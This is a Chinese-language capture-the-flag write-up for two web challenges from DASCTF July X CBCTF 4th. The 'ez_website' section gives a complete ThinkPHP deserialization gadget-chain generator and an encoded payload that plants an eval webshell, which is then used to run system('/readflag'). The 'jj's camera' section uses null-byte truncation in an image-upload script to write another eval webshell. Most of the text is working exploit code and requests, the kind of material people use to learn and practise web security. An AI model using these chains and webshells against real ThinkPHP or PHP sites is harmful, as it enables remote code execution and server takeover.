# 	DASCTF July X CBCTF 4th



## ez_website

根据https://ma4ter.cn/2527.html中的rce，考虑到web根目录不可写，换runtime写：

```php
<?php
namespace think\process\pipes {
    class Windows {
        private $files = [];

        public function __construct($files)
        {
            $this->files = [$files]; //$file => /think/Model的子类new Pivot(); Model是抽象类
        }
    }
}

namespace think {
    abstract class Model{
        protected $append = [];
        protected $error = null;
        public $parent;

        function __construct($output, $modelRelation)
        {
            $this->parent = $output;  //$this->parent=> think\console\Output;
            $this->append = array("xxx"=>"getError");     //调用getError 返回this->error
            $this->error = $modelRelation;               // $this->error 要为 relation类的子类，并且也是OnetoOne类的子类==>>HasOne
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{
        function __construct($output, $modelRelation)
        {
            parent::__construct($output, $modelRelation);
        }
    }
}

namespace think\model\relation{
    class HasOne extends OneToOne {

    }
}
namespace think\model\relation {
    abstract class OneToOne
    {
        protected $selfRelation;
        protected $bindAttr = [];
        protected $query;
        function __construct($query)
        {
            $this->selfRelation = 0;
            $this->query = $query;    //$query指向Query
            $this->bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量
        }
    }
}

namespace think\db {
    class Query {
        protected $model;

        function __construct($model)
        {
            $this->model = $model; //$this->model=> think\console\Output;
        }
    }
}
namespace think\console{
    class Output{
        private $handle;
        protected $styles;
        function __construct($handle)
        {
            $this->styles = ['getAttr'];
            $this->handle =$handle; //$handle->think\session\driver\Memcached
        }

    }
}
namespace think\session\driver {
    class Memcached
    {
        protected $handler;

        function __construct($handle)
        {
            $this->handler = $handle; //$handle->think\cache\driver\File
        }
    }
}

namespace think\cache\driver {
    class File
    {
        protected $options=null;
        protected $tag;

        function __construct(){
            $this->options=[
                'expire' => 3600,
                'cache_subdir' => false,
                'prefix' => '',
                'path'  => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/a.php',
                'data_compress' => false,
            ];
            $this->tag = 'xxx';
        }

    }
}

namespace {
    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());
    $Output = new think\console\Output($Memcached);
    $model = new think\db\Query($Output);
    $HasOne = new think\model\relation\HasOne($model);
    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));
    echo urlencode(serialize($window));

}
```

反序列化：

```php
http://b581b27f-0c02-4748-8e55-10e03abc02e5.node4.buuoj.cn/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A130%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
```

执行`/readflag`：

```
http://b581b27f-0c02-4748-8e55-10e03abc02e5.node4.buuoj.cn/runtime/a.php12ac95f1498ce51d2d96a249c09c1998.php

ccc=system('/readflag');
```



## jj's camera

经过一系列的查找，发现了源码https://buliang0.tk/archives/0227.html

只有qbl.php那里可以利用：

```php
if(preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)){
  $type = $result[2];
  if(in_array($type,array('bmp','png'))){
    $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type;
    file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_img)));
    header("Location: ".$url);
  }
}
```

想办法写马，但是后缀似乎不可控。看了一下php版本，是5.2.17，可以00截断。但是注意：

```php
$id = trim($_GET['id']);
```

所以%00后面再添上个东西就可以了。

```php
https://node4.buuoj.cn:26590/qbl.php?id=.feng.php%00123&url=123

img=data:image/png;base64,PD9waHAgZXZhbCgkX1BPU1RbMF0pOw==
```















